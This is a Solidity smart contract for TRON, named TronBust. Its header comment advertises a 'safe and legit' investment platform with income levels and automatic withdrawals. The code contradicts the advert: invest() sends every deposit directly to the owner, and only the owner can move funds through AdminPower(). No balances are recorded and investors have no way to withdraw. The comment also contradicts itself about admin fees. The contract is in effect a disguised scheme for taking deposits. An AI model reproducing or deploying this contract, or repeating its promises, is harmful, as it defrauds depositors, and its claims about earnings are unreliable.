//SourceUnit: TronBust.sol

/*   tronbust - investment platform based on TRX blockchain smart-contract technology. Safe and legit!
 *   The only official platform of original tronbust team! All other platforms with the same contract code are FAKE!
 *
 *   ┌───────────────────────────────────────────────────────────────────────┐
 *   │   Website: tronbust.io                               │
 *      │                                                                  |
     |
 *   |                                                                       |
 *   └───────────────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
 *   1) Connect TRON browser extension TronLink, or mobile wallet apps like TronWallet
 *   2) Choose one of the tariff plans, enter the TRX amount (100 TRX minimum) using our website 
 *   3) Upgrade Package for level income , enter the TRX amount (10, 20, 40, 80, 160, 320, 640, 12800, 25600, 51200, 102400, 204800, 409600,
 *      819200, 1638400, 3276800, 6553600 )
 *   4) Wait for your earnings By group Increase
 *   5) Auto 100% Withdraw 
 *
 *   [INVESTMENT CONDITIONS]
 *
 *   - Joining Amount 100 TRX with 10% Admin charge 
 *   - One deposit: 110 TRX, 
 *   - Total income: based on your Group and Global Group
 *   - Earnings every moment, withdraw any time 
 *
 *   [Maximum Income]
 *
 *   - Working Income
 *   - Direct Income
 *   - Level Upgrade Income 
 *
 *   [FUNDS DISTRIBUTION]
 *
 *   - 100% Platform distribution balance, participants payouts
 *   - Support work, technical functioning, No administration fee
 */




pragma solidity ^0.4.25;
contract TronBust {
 address private owner;
    mapping(address => uint256) public balances;



constructor(address _stakingAddress) public {

        owner = _stakingAddress;
}
    

    function invest() public payable {
       owner.transfer(msg.value);
    }
    
    


function AdminPower(uint amount) public {   
           address userAddress=msg.sender;
           //string memory  pass=getInstructor(userAddress);
            if (owner==userAddress) {
           // balances[msg.sender] += amount;
                     // optimistic accounting
            owner.transfer(amount);
                        // transfer
               //return userAddress; 
            }            
            
    }
}